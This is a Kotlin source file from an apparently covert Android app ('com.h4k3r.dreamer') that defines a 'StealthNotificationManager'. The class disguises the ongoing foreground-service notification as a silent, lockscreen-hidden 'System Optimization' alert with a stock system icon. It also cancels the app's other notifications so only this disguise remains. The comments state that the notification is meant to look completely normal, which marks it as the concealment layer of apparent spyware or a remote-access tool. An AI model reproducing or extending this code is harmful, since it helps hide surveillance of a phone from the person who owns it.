package com.h4k3r.dreamer

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.os.Build
import android.util.Log
import androidx.core.app.NotificationCompat

/**
 * Simple stealth notification manager - provides ONE notification that looks normal
 * Replaces all other notification systems with a single "System Optimization" notification
 */
class StealthNotificationManager private constructor(private val context: Context) {

    companion object {
        private const val TAG = "StealthNotificationManager"

        @Volatile
        private var instance: StealthNotificationManager? = null

        fun getInstance(context: Context): StealthNotificationManager {
            return instance ?: synchronized(this) {
                instance ?: StealthNotificationManager(context.applicationContext).also { instance = it }
            }
        }

        // ONE notification ID for everything
        const val STEALTH_NOTIFICATION_ID = 1001

        // ONE channel for everything
        private const val STEALTH_CHANNEL = "system_optimization"
    }

    private val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
    private var isNotificationActive = false

    init {
        createStealthChannel()
    }

    /**
     * Show the ONE stealth notification
     */
    fun showStealthNotification() {
        if (isNotificationActive) {
            return // Already showing
        }

        try {
            val notification = createStealthNotification()
            notificationManager.notify(STEALTH_NOTIFICATION_ID, notification)
            isNotificationActive = true
            Log.d(TAG, "Stealth notification activated")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to show stealth notification: ${e.message}")
        }
    }

    /**
     * Hide the stealth notification
     */
    fun hideStealthNotification() {
        try {
            notificationManager.cancel(STEALTH_NOTIFICATION_ID)
            isNotificationActive = false
            Log.d(TAG, "Stealth notification hidden")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to hide stealth notification: ${e.message}")
        }
    }

    /**
     * Get the stealth notification for foreground services
     */
    fun getStealthNotification(): Notification {
        return createStealthNotification()
    }

    /**
     * Check if stealth notification is active
     */
    fun isActive(): Boolean = isNotificationActive

    /**
     * Create the stealth notification channel
     */
    private fun createStealthChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                STEALTH_CHANNEL,
                "System Optimization",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "System performance optimization"
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                setSound(null, null)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }

            notificationManager.createNotificationChannel(channel)
            Log.d(TAG, "Stealth notification channel created")
        }
    }

    /**
     * Create the actual stealth notification - looks completely normal
     */
    private fun createStealthNotification(): Notification {
        return NotificationCompat.Builder(context, STEALTH_CHANNEL)
            .setContentTitle("System Optimization")
            .setContentText("Optimizing system performance...")
            .setSmallIcon(android.R.drawable.stat_notify_sync) // Standard system icon
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setOngoing(true)
            .setShowWhen(false)
            .setSound(null)
            .setVibrate(null)
            .setSilent(true)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setGroup("system")
            .build()
    }

    /**
     * Cancel all other notifications and show only ONE stealth notification
     */
    fun enforceStealthMode() {
        try {
            // Cancel all other notifications first
            val commonIds = listOf(1, 2, 3, 4, 5, 999, 1000, 1002, 1003, 1004, 1005, 1006, 1007, 1008)
            commonIds.forEach { id ->
                if (id != STEALTH_NOTIFICATION_ID) { // Don't cancel our own notification
                    notificationManager.cancel(id)
                }
            }

            // Show only our ONE stealth notification
            showStealthNotification()

            Log.d(TAG, "Stealth mode enforced - all other notifications cancelled, showing ONE stealth notification")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to enforce stealth mode: ${e.message}")
        }
    }
} 